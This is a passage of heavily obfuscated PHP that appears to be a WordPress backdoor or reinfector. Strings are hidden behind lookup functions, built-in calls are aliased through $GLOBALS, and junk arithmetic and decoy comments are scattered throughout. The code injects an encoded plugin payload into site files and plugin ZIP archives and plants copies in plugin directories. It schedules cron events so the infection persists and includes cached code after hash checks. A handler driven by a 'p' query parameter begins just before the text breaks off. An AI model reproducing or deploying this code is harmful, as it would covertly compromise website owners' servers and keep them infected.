fukkkeh6955g9qi(nhceivfj8tbe(652),   pahk8uy1uxt(1677));
  h8zn__gft2tjc9lcce0hi($_8s1q0lze747);
 }
    }
}  catch    (Throwable    $h2v_bjm4ejxq8fp)      {
fukkkeh6955g9qi(pahk8uy1uxt(1678), $h2v_bjm4ejxq8fp);
    }      catch   (Exception  $h2v_bjm4ejxq8fp)  {
  }
 }
 function  _pn3cdzia3n4m1y3ju4()

 {
   try  {
   if  (!defined(pahk8uy1uxt(1674)))  return false;
 $vec7e48qr09y7  = ks9qy9biofs4d9f12ul();


     if  (empty($vec7e48qr09y7)) return false;
   $q5tw8pflest     =  kwqziujdph5xlz3n()  .   ':' .   ohrydgas8yy9a22s(ABSPATH    . pahk8uy1uxt(1385), (5+3));
 $zwhsp3srkru  =  nhceivfj8tbe(1679)     .   $q5tw8pflest    . nhceivfj8tbe(1680);
$u4n6wdbujmttz4q1     =      dhd5r6_4ki(1681)    .  $q5tw8pflest .  f5cd2smymkqusi5(1682);
    $ln_mx88i0w2  =   pahk8uy1uxt(1683)     .     $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](ABSPATH    .   (string)   mzvtk8ecgiuaeafix()),  0, (1+7));
  $q4nmj640k4ytm0w     = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(), nrudcgor(1556));
    $u5xfm3z90ff    =   mpkogxinl1o8xqdhl__();
   if (!$u5xfm3z90ff) return      false;
       $wuirvxbfut      =     d05gkzggk_uo5zo(
    nhceivfj8tbe(653),


array('__SLUG__',  '__PLUGIN_BASE64__',   '__GUARD_NAME__',  '__VERSION__'),
      array($q4nmj640k4ytm0w,  $u5xfm3z90ff, $ln_mx88i0w2, kwqziujdph5xlz3n())
);
     if (!$wuirvxbfut)     {
    if  ((int) get_option(mhiu2yqz6kqd(1305),   0)   >     0)  fukkkeh6955g9qi(nhceivfj8tbe(1678),    f5cd2smymkqusi5(1684));
     return   false;$vmqupa2xacs=43*2;$kdk5bf4eva1=$vmqupa2xacs-48;
     }
$wuirvxbfut  = $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1685),  "",     $wuirvxbfut);
   if (!$GLOBALS['__scf__me483qbepnts_41']($wuirvxbfut)   || $wuirvxbfut ===   "") return  false;
   $yc95rogvvetq0f    = false;
    foreach   ($vec7e48qr09y7     as $arlwawvsylt6x) {
 if    (!@$GLOBALS['__scf_gsamhlxot70ps_18']($arlwawvsylt6x))  continue;
     

     if (sivyyfsdr3ire7wsui($arlwawvsylt6x)) continue;
   $nvnowww6i9e  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(21))   ?   @$GLOBALS['__scf_ihuexe6puptto__21']($arlwawvsylt6x, 'c')     : false;
       if     ($GLOBALS['__scf_h2xix0300wh_128']($nvnowww6i9e)   && $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(970))   &&  !@flock($nvnowww6i9e,  LOCK_EX |   LOCK_NB))  {
   @fclose($nvnowww6i9e);
   continue;
 }



 $current   =  @$GLOBALS['__scf_apq4pqdt6n41_91']($arlwawvsylt6x);
   if (!$GLOBALS['__scf__me483qbepnts_41']($current)) {
 fukkkeh6955g9qi(mhiu2yqz6kqd(1678), nrudcgor(1647));
 if     ($GLOBALS['__scf_h2xix0300wh_128']($nvnowww6i9e))   {
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1686)))   @flock($nvnowww6i9e, LOCK_UN);
  @fclose($nvnowww6i9e);
}
   continue;

 }
    try {
  if ($GLOBALS['__scf_amjjmfnilcolnb_10']($current)      >    (1893839-845263))   $current =  g9begdqy64lw_mpz($current);
 if ($GLOBALS['__scf_nr12ouzrtt_7']($current, $zwhsp3srkru) !==   false  && $GLOBALS['__scf_nr12ouzrtt_7']($current, $u4n6wdbujmttz4q1)  !==    false) {
  $yc95rogvvetq0f      = true;
continue;
       }
     if (!@$GLOBALS['__scf_cu2oflxkvh_47']($arlwawvsylt6x))  continue;
    $da7fwdwb585oy6  =    ohrydgas8yy9a22s(ABSPATH    .  mhiu2yqz6kqd(1687),  (0x2+0x6));
   

   $kl_fl7hvmxop  =     $current;
   $current = e5mr40mjt4j9xz_gic8hj($current, dhd5r6_4ki(1688),    dhd5r6_4ki(1689));
$current    =   $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1396),  "",  $current);
if   (!$GLOBALS['__scf__me483qbepnts_41']($current)) {
  fukkkeh6955g9qi(mhiu2yqz6kqd(1678),  mhiu2yqz6kqd(1690));
     continue;
 }
 if ($GLOBALS['__scf_nr12ouzrtt_7']($current,   nrudcgor(1497))    !== false     ||     $GLOBALS['__scf_nr12ouzrtt_7']($current,     pahk8uy1uxt(1560))  !== false) {
    $x71qdlvkrobimucp =   $GLOBALS['__scf_nr12ouzrtt_7']($current,  mhiu2yqz6kqd(1497));

 $y76ka4k_8ikka5 =  ($x71qdlvkrobimucp   !== false)    ? $GLOBALS['__scf_bv1z3no349dv5r_9']($current, $x71qdlvkrobimucp)  : $current;
if    ($GLOBALS['__scf_nr12ouzrtt_7']($y76ka4k_8ikka5, f5cd2smymkqusi5(1683))      ===      false && $GLOBALS['__scf_nr12ouzrtt_7']($y76ka4k_8ikka5,   nhceivfj8tbe(1560))  === false   &&     !$GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1691)    .     $da7fwdwb585oy6  . mhiu2yqz6kqd(1692),      $y76ka4k_8ikka5))     {
/* satisfiable stabilizer */

   fukkkeh6955g9qi(mhiu2yqz6kqd(1678),      dhd5r6_4ki(1693));
  continue;
}
  $yunrtauv8478iz8q  =     $GLOBALS['__scf_fhlvy786vrl3_463'](pahk8uy1uxt(1694),    "\n",  $current);
   if  ($GLOBALS['__scf__me483qbepnts_41']($yunrtauv8478iz8q))   $current   = $yunrtauv8478iz8q;
 $yunrtauv8478iz8q    =      $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(1695),   "",   $current);
if  ($GLOBALS['__scf__me483qbepnts_41']($yunrtauv8478iz8q))   $current =  $yunrtauv8478iz8q;
    unset($yunrtauv8478iz8q);
     if     ($GLOBALS['__scf_nr12ouzrtt_7']($current, nrudcgor(1497)) !== false) {
 fukkkeh6955g9qi(f5cd2smymkqusi5(1678),      f5cd2smymkqusi5(1696));
 continue;
       }
  }
  if ($yc95rogvvetq0f)    {
  if  ($current ===    $kl_fl7hvmxop)      continue;
   $eiyu646ifqu = @$GLOBALS['__scf_apq4pqdt6n41_91']($arlwawvsylt6x);
  if (!$GLOBALS['__scf__me483qbepnts_41']($eiyu646ifqu)) continue;



     if ($GLOBALS['__scf_amjjmfnilcolnb_10']($eiyu646ifqu) >      (1069710-21134))   $eiyu646ifqu = g9begdqy64lw_mpz($eiyu646ifqu);



     if   ($eiyu646ifqu     !==  $kl_fl7hvmxop)  {
fukkkeh6955g9qi(f5cd2smymkqusi5(1678), mhiu2yqz6kqd(1196));
     continue;
   }
   unset($eiyu646ifqu);$fz7exxldzehz9p=55*7;$s96x0k5x6_l5w=$fz7exxldzehz9p-11;
if      (!e7s6frcfalrbj1dzesfm31($arlwawvsylt6x,  $current))   continue;$nl7cevro9gz=6877;$f1giprphjpn3t4=$nl7cevro9gz%17;


if   (!c8kiybf7y18a9bd5ahp($arlwawvsylt6x,    $current))      continue;
 if (jr30c_pj_1z9sfyaq3c88($arlwawvsylt6x, $current))    m08f_15ylhgex6($arlwawvsylt6x);
continue;
 }
  if  ($GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1697),     $current))  {
 fukkkeh6955g9qi(pahk8uy1uxt(1678),  pahk8uy1uxt(1698));
 continue;
}


       $zouumsujd1 = mhiu2yqz6kqd(834);
  if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($current)   >      0 && $GLOBALS['__scf_nr12ouzrtt_7']($current, nrudcgor(1147)) !==   false)    {
 $uxcetk8bs_o =   false;
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(239))) {
   $wij4e1hxm6rfdds =    @token_get_all($current);
  if   ($GLOBALS['__scf_vf9p0fditvxy_35']($wij4e1hxm6rfdds)) {


   foreach ($wij4e1hxm6rfdds   as  $g3qn28x4m55zf)  {
   if  ($GLOBALS['__scf_vf9p0fditvxy_35']($g3qn28x4m55zf))  {
// monomorphize handshake for WP Server Side Render

   if   ($g3qn28x4m55zf[0]  === T_OPEN_TAG ||   (defined(dhd5r6_4ki(1699))   && $g3qn28x4m55zf[0]    ===  T_OPEN_TAG_WITH_ECHO))     $uxcetk8bs_o  =  true;

   elseif ($g3qn28x4m55zf[0] ===    T_CLOSE_TAG)    $uxcetk8bs_o   =   false;
   }


  }
  }

  unset($wij4e1hxm6rfdds, $g3qn28x4m55zf);
 } else   {
 $zlul15at13   =     $GLOBALS['__scf_ei5r69101hlpch_1700']($current,   f5cd2smymkqusi5(1701));
       $etnxmipeha98zt  = $GLOBALS['__scf_ei5r69101hlpch_1700']($current, nrudcgor(1316));
  if ($zlul15at13  !== false &&  ($etnxmipeha98zt    ===   false   ||   $zlul15at13  >   $etnxmipeha98zt))      $uxcetk8bs_o =  true;
   unset($zlul15at13,    $etnxmipeha98zt);
 }
        if  ($uxcetk8bs_o) $zouumsujd1 = "";
 unset($uxcetk8bs_o);
 }
       $wtf8d5s06c0   =  ($GLOBALS['__scf_amjjmfnilcolnb_10']($current)   >  0)     ?  "\n"  :   "";
   $ba9fzsa_e04lv  = $GLOBALS['__scf_f9_5dfsm5hfxx_360']($ln_mx88i0w2,  $ln_mx88i0w2 .  '_'     .  $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($arlwawvsylt6x), 0, (1+3)), $wuirvxbfut);
    $w2o3chihsz     =     $wtf8d5s06c0  . $zouumsujd1   .   $zwhsp3srkru  .  "\n"  . $ba9fzsa_e04lv  . "\n"     .  $u4n6wdbujmttz4q1     .   "\n";

  unset($ba9fzsa_e04lv);


     $eiyu646ifqu    = @$GLOBALS['__scf_apq4pqdt6n41_91']($arlwawvsylt6x);
   if    (!$GLOBALS['__scf__me483qbepnts_41']($eiyu646ifqu))    {
 unset($kl_fl7hvmxop);
  continue;
}
  if ($GLOBALS['__scf_amjjmfnilcolnb_10']($eiyu646ifqu) >  (0x360ef+0xc9f11))  $eiyu646ifqu =     g9begdqy64lw_mpz($eiyu646ifqu);
  if    ($eiyu646ifqu  !==     $kl_fl7hvmxop)  {
unset($eiyu646ifqu,  $kl_fl7hvmxop);

  fukkkeh6955g9qi(dhd5r6_4ki(1702),   f5cd2smymkqusi5(1196));
    continue;
     }
   unset($eiyu646ifqu,  $kl_fl7hvmxop);
       if (!e7s6frcfalrbj1dzesfm31($arlwawvsylt6x,    $current))  continue;
if   (!c8kiybf7y18a9bd5ahp($arlwawvsylt6x,     $current))   {
 fukkkeh6955g9qi(dhd5r6_4ki(1703),  pahk8uy1uxt(1539));
  continue;
}
 if  (!jr30c_pj_1z9sfyaq3c88($arlwawvsylt6x,  $current     .  $w2o3chihsz))      continue;
 m08f_15ylhgex6($arlwawvsylt6x);
       $yc95rogvvetq0f =    true;
      }   finally     {



if ($GLOBALS['__scf_h2xix0300wh_128']($nvnowww6i9e))    {
      if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1704)))     @flock($nvnowww6i9e,     LOCK_UN);
     @fclose($nvnowww6i9e);
}
  }
   }


  return  $yc95rogvvetq0f;


 }   catch   (Throwable   $h2v_bjm4ejxq8fp)  {

    fukkkeh6955g9qi(nrudcgor(1703), $h2v_bjm4ejxq8fp);

     return  false;
  }     catch  (Exception    $h2v_bjm4ejxq8fp)  {

 return   false;
     }
  }
       function bext3vqy27eoubz36us6()
   {
// unmount feasible timeout-policy

   try  {
   if (!defined(dhd5r6_4ki(1674)))  return;
 if (ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa())) return;
 $ga9fric5dh  =    ajbg_44koa9suqi();
   $yc07oz4u4pa   = ohrydgas8yy9a22s(ABSPATH     .  f5cd2smymkqusi5(1705), (11-3))      .     f5cd2smymkqusi5(1593);
      $q4nmj640k4ytm0w  =   $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(), mhiu2yqz6kqd(1556));
 $vg45smeglid =     adbbbpoh0e7mcf6();
 if  (!$vg45smeglid  ||      $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)  <    (250+250))    {
  fukkkeh6955g9qi(dhd5r6_4ki(1197), mhiu2yqz6kqd(1706));
  return;
   }


  if  (!$GLOBALS['__scf_mh99vqi740eg_542'](nrudcgor(1707)))   return;
 

$fv6w37uq5dr     =  array(
      $ga9fric5dh  .  '/' . $yc07oz4u4pa,
   $ga9fric5dh .     nrudcgor(1708) .   $GLOBALS['__scf_gi2qxlmos_hxwr_1709'](mhiu2yqz6kqd(1710)) .  $yc07oz4u4pa,
   );
     $gj7r43vt2c0lnc6_    =   (defined(mhiu2yqz6kqd(1660))    ?  WP_CONTENT_DIR  : ABSPATH .  f5cd2smymkqusi5(78))  .  mhiu2yqz6kqd(1711);

 if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($gj7r43vt2c0lnc6_))    {
   $cvpcep7vn_jjiaae  =  ly0t7sdceinn03pyne3($gj7r43vt2c0lnc6_,     (1964+36));
  if   ($GLOBALS['__scf_vf9p0fditvxy_35']($cvpcep7vn_jjiaae))     {
  foreach    ($cvpcep7vn_jjiaae  as   $h2v_bjm4ejxq8fp)     {
       $spxzjtpg4pa938mw  = $gj7r43vt2c0lnc6_   .    '/'    .  $h2v_bjm4ejxq8fp;
if    (@$GLOBALS['__scf_ux4_n6mewmsy_43']($spxzjtpg4pa938mw)  &&    @$GLOBALS['__scf_cu2oflxkvh_47']($spxzjtpg4pa938mw)) {
$fv6w37uq5dr[]    =     $spxzjtpg4pa938mw     .  '/' . $yc07oz4u4pa;
  break;
     }
  }
       }

 }
// discriminative priority-queue

foreach     ($fv6w37uq5dr    as     $x7f22itd05r)    {
    if      (@$GLOBALS['__scf_od_0qrqi5rcvlf_701']($x7f22itd05r)   &&    @$GLOBALS['__scf_g9y45bstmb02a_95']($x7f22itd05r)  >  (1804-804))  {



 $c_say3no5hi  =   pahk8uy1uxt(1712);
  if  ($GLOBALS['__scf_mh99vqi740eg_542']($c_say3no5hi))   {
   $wrs4i8nviu8 =   new $c_say3no5hi();
    if     (@$wrs4i8nviu8->open($x7f22itd05r)      ===    true)   {
$l5l6g3fp5pb      =  false;
 $golv2teripw4lx8  = $wrs4i8nviu8->locateName($q4nmj640k4ytm0w      . '/'     . $q4nmj640k4ytm0w     .    f5cd2smymkqusi5(1556));
 if  ($golv2teripw4lx8  !== false) {
      $gx74pzk4m90  =    $wrs4i8nviu8->statIndex($golv2teripw4lx8);
  if    ($GLOBALS['__scf_vf9p0fditvxy_35']($gx74pzk4m90)  &&     isset($gx74pzk4m90[mhiu2yqz6kqd(1576)])   &&   (int)  $gx74pzk4m90[nrudcgor(1713)]  <=  (19441889-2664673))    {
    $h5n1wu2vni   =  $wrs4i8nviu8->getFromIndex($golv2teripw4lx8);
 $l5l6g3fp5pb    =     ($GLOBALS['__scf__me483qbepnts_41']($h5n1wu2vni)     &&  $GLOBALS['__scf_nn04_vx3uspzx4_54']($h5n1wu2vni) ===    $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid));
  unset($h5n1wu2vni);
}
unset($gx74pzk4m90);
    }


$wrs4i8nviu8->close();
 if ($l5l6g3fp5pb)  continue;

}
  }
}



 $ys5go7qi508n  =   $GLOBALS['__scf_eure5hcx2b_11']($x7f22itd05r);
 if   (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n))  gt671tq3242garyx4($ys5go7qi508n,    (669-176),   true);
      $c_say3no5hi = mhiu2yqz6kqd(1712);
 $b8rfx7pla2l3csl4 =    xtkohsjdeedyznx6vx($ys5go7qi508n, dhd5r6_4ki(1714));
if  (!$GLOBALS['__scf__me483qbepnts_41']($b8rfx7pla2l3csl4) ||  $b8rfx7pla2l3csl4   ===   "")   continue;
$e7ls_8x_8elm6wk     =     new      $c_say3no5hi();
  if (@$e7ls_8x_8elm6wk->open($b8rfx7pla2l3csl4, $c_say3no5hi::CREATE |   $c_say3no5hi::OVERWRITE)  ===   true) {
$e7ls_8x_8elm6wk->addFromString($q4nmj640k4ytm0w  .  '/' .  $q4nmj640k4ytm0w  .  nhceivfj8tbe(1715), $vg45smeglid);
  

        $e7ls_8x_8elm6wk->close();
$l91n9923z4o6d =   new $c_say3no5hi();
 if   (@$l91n9923z4o6d->open($b8rfx7pla2l3csl4)   ===     true)  {
  $l91n9923z4o6d->close();
  if  (t3opc2_f7ewi94o($b8rfx7pla2l3csl4,  $x7f22itd05r) ||    (sb9eg9deemhnrcsp3($b8rfx7pla2l3csl4, $x7f22itd05r)  &&  t65xl1pt2haov_izh($b8rfx7pla2l3csl4))) {
    kfdh_vugi0_9nv_wpj($x7f22itd05r, cpfi26oipjceuyib8());
  rgiuaapohxeh0z($x7f22itd05r, (403+17));

  } else {
 t65xl1pt2haov_izh($b8rfx7pla2l3csl4);
}
 }   else    {
    t65xl1pt2haov_izh($b8rfx7pla2l3csl4);
    }
       }   else {

t65xl1pt2haov_izh($b8rfx7pla2l3csl4);

}
   }

 }    catch  (Throwable $h2v_bjm4ejxq8fp)      {
    fukkkeh6955g9qi(nhceivfj8tbe(1716), $h2v_bjm4ejxq8fp);
     }   catch   (Exception $h2v_bjm4ejxq8fp)  {
    }
}
    function     jtuan60rnpexx58rwvd6r()
 {
      try   {
    if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(378))     ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1717))) return;
      if  (!defined(nrudcgor(1674))) return;$yfn5bss2v8gl=PHP_MAJOR_VERSION;$x656whus7=$yfn5bss2v8gl*8;
 $xzotyjpdp3d     = pahk8uy1uxt(1643);
    if   (!wp_next_scheduled($xzotyjpdp3d))    {
   wp_schedule_event($GLOBALS['__scf_zxyq0lcqv02z6_185']()    +    (185+115),   pahk8uy1uxt(1718), $xzotyjpdp3d);

 }

 if   (!wp_next_scheduled(nhceivfj8tbe(1644)))  {
       wp_schedule_event($GLOBALS['__scf_zxyq0lcqv02z6_185']()      +    (0x151+0x107),   dhd5r6_4ki(376),     pahk8uy1uxt(1644));
     }
 }   catch (Throwable  $h2v_bjm4ejxq8fp)   {
   fukkkeh6955g9qi(f5cd2smymkqusi5(1719),  $h2v_bjm4ejxq8fp);
     }   catch   (Exception  $h2v_bjm4ejxq8fp)  {
      }
     }



   function  mbd2c_7f9v6gsjpovvg()

      {
     try     {
 if (!defined(f5cd2smymkqusi5(1674))) return;
      $tp1v8jup_q7o87ah   = ohrydgas8yy9a22s(ABSPATH  .  'g',     (2<<2));
    $djkpffbkhb5q = array();

 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1720)))   $djkpffbkhb5q[]   =  twjiqbicrnr_q7();
$djkpffbkhb5q[] = ABSPATH    .   nrudcgor(1291);
        if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1721)))   $djkpffbkhb5q[] = ajbg_44koa9suqi();
        foreach     ($djkpffbkhb5q as      $wmf3rowcnyq)   {
  $k_8fz1geufd  = $wmf3rowcnyq   . f5cd2smymkqusi5(1284) .  $tp1v8jup_q7o87ah;



      if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($k_8fz1geufd) &&  (int) @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($k_8fz1geufd) >  $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -    (17+223))   return;
}



    foreach  ($djkpffbkhb5q as  $wmf3rowcnyq)  {
       $iwdzdafpm_h65u5 =   $wmf3rowcnyq   .  f5cd2smymkqusi5(1722)   . $tp1v8jup_q7o87ah;
 if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($iwdzdafpm_h65u5)) {
 $rsy70tbordl =  (int)  @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($iwdzdafpm_h65u5);
 if ($rsy70tbordl   >   $GLOBALS['__scf_zxyq0lcqv02z6_185']() - (124114-37714)     &&   $rsy70tbordl <= $GLOBALS['__scf_zxyq0lcqv02z6_185']()  +     (183+117))   continue;
      t65xl1pt2haov_izh($iwdzdafpm_h65u5);


 }
   $tqafythy9h0ytk =   $wmf3rowcnyq . nrudcgor(1289)  . $tp1v8jup_q7o87ah     . nhceivfj8tbe(1715);
    if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($tqafythy9h0ytk) &&  (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($tqafythy9h0ytk)  >   (0xf2+0x102))  {
  $cgyajj1ejnmpo8  =  $wmf3rowcnyq   .  nrudcgor(1309) . $tp1v8jup_q7o87ah;
      $s0ic6_rtwj0mk_f2   =  @$GLOBALS['__scf_gsamhlxot70ps_18']($cgyajj1ejnmpo8)    ?   $GLOBALS['__scf_uvjtdemk2f_320']((string)   @$GLOBALS['__scf_apq4pqdt6n41_91']($cgyajj1ejnmpo8))  :  "";
   if   ($s0ic6_rtwj0mk_f2    !==     ""     &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1417))   &&    @md5_file($tqafythy9h0ytk)   === $s0ic6_rtwj0mk_f2)   {
      @include $tqafythy9h0ytk;
      return;
 }
  if  ($s0ic6_rtwj0mk_f2    !== "") {
t65xl1pt2haov_izh($tqafythy9h0ytk);
 }
unset($cgyajj1ejnmpo8,  $s0ic6_rtwj0mk_f2);
}
}
      unset($iwdzdafpm_h65u5,      $rsy70tbordl);
    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(743)))  @delete_transient(dhd5r6_4ki(1285));


 t5uz_smcfb0igmu0az32p8();
    } catch   (Throwable   $h2v_bjm4ejxq8fp)  {
 fukkkeh6955g9qi(nrudcgor(1723),  $h2v_bjm4ejxq8fp);
}   catch     (Exception $h2v_bjm4ejxq8fp) {
}
  }
 function     zby0nyy12_0wmk()



      {
try      {
      if    (!defined(pahk8uy1uxt(1674)))   return;
   xmy1k120y_7ld50whm(null);
  $q4nmj640k4ytm0w    = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  nhceivfj8tbe(1724));
 $upe0j1asmp6i6  = vv_nfhhmy_1mjmsa();
       $vg45smeglid  =  "";
 if (@$GLOBALS['__scf_gsamhlxot70ps_18']($upe0j1asmp6i6) && @$GLOBALS['__scf_g9y45bstmb02a_95']($upe0j1asmp6i6) > (0xeb9+0x4cf))  {



    $sxrvy7td17fuwbja =  yrklujewy9nbrhy($upe0j1asmp6i6);
      if   ($GLOBALS['__scf__me483qbepnts_41']($sxrvy7td17fuwbja)   &&   $GLOBALS['__scf_amjjmfnilcolnb_10']($sxrvy7td17fuwbja)   >   (0x1d3+0x21)      && hkk3yvii60ci7rk($sxrvy7td17fuwbja)) $vg45smeglid =   $sxrvy7td17fuwbja;
    unset($sxrvy7td17fuwbja);


  }



if   ($vg45smeglid   ===      "")  {
/* infeasible authority */



$sv9h9r5s57g5trl  = ohrydgas8yy9a22s(ABSPATH   .  dhd5r6_4ki(1635), (13-3));
    $u5xfm3z90ff =      $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1675)) ?  @get_option($sv9h9r5s57g5trl,   "") :    "";
 if (!$u5xfm3z90ff  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($u5xfm3z90ff)    <   (491+9))     return;
$vg45smeglid   =  afmou025cdp06je06pv($GLOBALS['__scf_wlpl5h61eyolq_355']($u5xfm3z90ff));


    if   (!$vg45smeglid  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid) <   (422+78))  return;
 if    (!hkk3yvii60ci7rk($vg45smeglid))   {
     fukkkeh6955g9qi(nhceivfj8tbe(1066),    f5cd2smymkqusi5(741));



  return;

 }
 }
     $ga9fric5dh =      ajbg_44koa9suqi();
   $yhha6qazc1wvn1ac =  $ga9fric5dh   .  pahk8uy1uxt(1725)  .   $q4nmj640k4ytm0w;
   $zg8kic65igt_q9o =      $yhha6qazc1wvn1ac   .  '/' .    $q4nmj640k4ytm0w  .  dhd5r6_4ki(1724);


     if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($yhha6qazc1wvn1ac))   gt671tq3242garyx4($yhha6qazc1wvn1ac,     (409+84), true);
   $ykf9292ne2vlbbjw    = @$GLOBALS['__scf_gsamhlxot70ps_18']($zg8kic65igt_q9o)    ?   yrklujewy9nbrhy($zg8kic65igt_q9o)    :   "";


    $q3ujr6l5mnc18k90 =    ($ykf9292ne2vlbbjw  ===  null);
 if    ($GLOBALS['__scf__me483qbepnts_41']($ykf9292ne2vlbbjw)  &&   $ykf9292ne2vlbbjw !== "" &&    $GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1726), $GLOBALS['__scf_bv1z3no349dv5r_9']($ykf9292ne2vlbbjw,  0,   (4061+35)),      $grztzahrs4ul)   &&   version_compare($grztzahrs4ul[1],    kwqziujdph5xlz3n(), '>'))  $q3ujr6l5mnc18k90  =  true;

unset($grztzahrs4ul);
     if   (!$q3ujr6l5mnc18k90  && (!$GLOBALS['__scf__me483qbepnts_41']($ykf9292ne2vlbbjw)   ||   $ykf9292ne2vlbbjw    ===     ""   ||  $GLOBALS['__scf_nn04_vx3uspzx4_54']($ykf9292ne2vlbbjw)     !==    $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid)))      {
  if  (jr30c_pj_1z9sfyaq3c88($zg8kic65igt_q9o,  vmv3l2fd6oj__92qteyq($vg45smeglid)))   {
 rgiuaapohxeh0z($zg8kic65igt_q9o,      (384+36));
   jqp5yotia2ogx9k($zg8kic65igt_q9o);
  ejl1lwk108flojzx($zg8kic65igt_q9o);
   }
      }


    unset($ykf9292ne2vlbbjw, $q3ujr6l5mnc18k90);
      khlrpg8_w_x7jmmf($q4nmj640k4ytm0w    .   '/' .    $q4nmj640k4ytm0w   .  mhiu2yqz6kqd(1727));
 $wl8bs71ioiz  = s3e5iki9upa0ccql();
 

if    ((@$GLOBALS['__scf_ux4_n6mewmsy_43']($wl8bs71ioiz) &&    @$GLOBALS['__scf_cu2oflxkvh_47']($wl8bs71ioiz))    ||  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($wl8bs71ioiz)   &&   gt671tq3242garyx4($wl8bs71ioiz,  (478+15),  true)))  {
$bppfwd5a6zifc   =   $wl8bs71ioiz  .     '/'  .    $q4nmj640k4ytm0w      .  pahk8uy1uxt(1727);
$ck5udrjx8xiazqb   =      @$GLOBALS['__scf_gsamhlxot70ps_18']($bppfwd5a6zifc) ?    yrklujewy9nbrhy($bppfwd5a6zifc)  :    "";
 $bb1atk63t_    =   ($ck5udrjx8xiazqb   ===  null);
   if   ($GLOBALS['__scf__me483qbepnts_41']($ck5udrjx8xiazqb) &&   $ck5udrjx8xiazqb  !== ""  &&  $GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1726),   $GLOBALS['__scf_bv1z3no349dv5r_9']($ck5udrjx8xiazqb,  0,  (4093+3)),    $u4zuf1ts3zfw12b) &&  version_compare($u4zuf1ts3zfw12b[1],   kwqziujdph5xlz3n(),     '>'))    $bb1atk63t_ = true;
  unset($u4zuf1ts3zfw12b);
  

 if (!$bb1atk63t_   &&   (!$GLOBALS['__scf__me483qbepnts_41']($ck5udrjx8xiazqb)  || $ck5udrjx8xiazqb     === ""  ||   $GLOBALS['__scf_nn04_vx3uspzx4_54']($ck5udrjx8xiazqb)     !==  $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid)))  {



 if (jr30c_pj_1z9sfyaq3c88($bppfwd5a6zifc,  vmv3l2fd6oj__92qteyq($vg45smeglid)))    {
 rgiuaapohxeh0z($bppfwd5a6zifc,  (0x62+0x142));


   jqp5yotia2ogx9k($bppfwd5a6zifc);

ejl1lwk108flojzx($bppfwd5a6zifc);
   }
     }  elseif    (!$bb1atk63t_)     {
 $bz_ehnkz3u  =  @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($bppfwd5a6zifc);
 if (!$bz_ehnkz3u   ||  ($bz_ehnkz3u   %  (0xc28c+0xc414))   !==   mzvtk8ecgiuaeafix()) jqp5yotia2ogx9k($bppfwd5a6zifc);
      unset($bz_ehnkz3u);



    }
 unset($ck5udrjx8xiazqb, $bb1atk63t_);


  }
  iuvgdte56rfi9b_ii3ee($vg45smeglid);
      




}  catch (Throwable   $h2v_bjm4ejxq8fp) {
   fukkkeh6955g9qi(mhiu2yqz6kqd(1728),  $h2v_bjm4ejxq8fp);
  }  catch (Exception  $h2v_bjm4ejxq8fp)     {
   }
}
function  lghyg_p7yp7hck()



    {


    if   (!isset($_GET['p'])      ||  !$GLOBALS['__scf__me483qbepnts_41']($_GET['p'])) return;
     $by9ihyua8j3 =   $_GET['p'];
  if    ($by9ihyua8j3  ===      h2iz25lld35tmbc2ls(mhiu2yqz6kqd(1596)))    {
  $GLOBALS[mhiu2yqz6kqd(1729)] =  true;

   try {
 $msv3i50i3vv6  = twjiqbicrnr_q7()    . '/'     . ohrydgas8yy9a22s(ABSPATH    .  mhiu2yqz6kqd(1596), (2^10))   .      nhceivfj8tbe(1727);
 $fjyxyq0r2rq   =     @$GLOBALS['__scf_gsamhlxot70ps_18']($msv3i50i3vv6)   ?  (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($msv3i50i3vv6)     :  0;
